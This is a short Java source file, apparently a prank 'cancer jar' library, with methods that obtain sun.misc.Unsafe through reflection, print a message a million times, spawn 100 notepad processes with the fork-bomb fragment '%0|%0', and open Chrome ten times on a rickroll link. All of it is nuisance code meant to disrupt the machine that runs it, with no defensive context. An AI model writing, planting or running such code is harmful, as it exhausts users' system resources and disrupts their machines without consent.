package tv.circuitrcay.cancerjar;


import sun.misc.Unsafe;

import java.io.IOException;
import java.lang.reflect.Constructor;

public class CancerShit {
    public static Unsafe createUnsafe() throws Exception {
        Constructor<Unsafe> ctor = Unsafe.class.getDeclaredConstructor();
        ctor.setAccessible(true);
        return ctor.newInstance();
    }
    public static void spamSucc() {
        for(int i=0; i<1000000; i++) {
            System.out.println("FREE SUCC!!!");
        }
    }
    public static void notepad() throws IOException {
        Runtime runtime = Runtime.getRuntime();
        for(int i=0; i<100; i++) {
            Process process = runtime.exec("notepad %0|%0");
        }
    }
    public static void rickroll() throws IOException{
        Runtime runtime = Runtime.getRuntime();
        for(int i=0; i<10; i++) {
            Process process = runtime.exec("chrome https://www.youtube.com/watch?v=oHg5SJYRHA0");
        }
    }
}
